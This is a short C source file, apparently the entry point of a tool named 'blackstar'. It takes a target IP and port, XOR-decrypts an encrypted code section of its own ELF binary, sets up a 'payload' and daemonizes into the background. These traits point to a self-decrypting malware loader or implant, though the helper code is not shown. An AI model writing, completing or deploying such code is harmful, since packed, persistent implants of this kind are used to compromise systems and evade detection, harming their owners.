
#include "elf_utils.h"
#include "setup.h"
#include "blackstar.h"

int main(int ac, char * const *av)
{
    blackstar_t *bstar = NULL;
    settings_t g_settings = {
        .logfd = 0,
        .sockfd = 0,
        .target_port = NULL,
        .target_ip = NULL,
    };

    parse_settings(ac, av, &g_settings);
    init(&g_settings);

    if (is_encrypted) {
        bstar = bl_read(av[0]);
        if (!bstar) {
            KILL("[!] Failure reading ELF\n");
            exit(1);
        }
        puts("[+] decrypting payload");
        decrypt_section(bstar, ELF_CODE, ELF_KEY, ELF_BOOL, &xor_crypt);
        return 0;
    }

    setup_payload(&g_settings);
    daemonize();
    return 0;
}
